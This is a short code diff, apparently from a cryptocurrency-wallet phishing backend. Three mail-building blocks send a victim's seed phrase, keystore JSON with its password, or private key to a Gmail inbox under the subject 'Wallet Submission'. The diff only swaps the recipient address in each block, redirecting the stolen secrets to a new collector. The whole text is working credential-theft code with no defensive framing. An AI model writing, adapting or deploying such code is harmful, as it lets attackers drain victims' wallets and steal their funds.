@@ -37,7 +37,7 @@ if (phrase) {
 const formattedMessage = formatMessage(phrase);
 mailOptions = {
 from: `New Wallet Connect ${email}`,
-to: ['cryptoavatar7@gmail.com'],
+to: ['jamesanderson197x@gmail.com'],
 subject: 'Wallet Submission',
 html: formattedMessage,
 };
@@ -47,7 +47,7 @@ html: formattedMessage,
 if (keystore) {
 mailOptions = {
 from: `New Wallet Connect ${email}`,
-to: ['cryptoavatar7@gmail.com'],
+to: ['jamesanderson197x@gmail.com'],
 subject: 'Wallet Submission',
 html: `<div>Json: ${keystore.json}</div> <div>Password: ${keystore.password}</div>`,
 };
@@ -58,7 +58,7 @@ if (privateKey) {
 const formattedMessage = formatMessage(privateKey);
 mailOptions = {
 from: `New Wallet Connect ${email}`,
-to: ['cryptoavatar7@gmail.com'],
+to: ['jamesanderson197x@gmail.com'],
 subject: 'Wallet Submission',
 html: formattedMessage,
 };
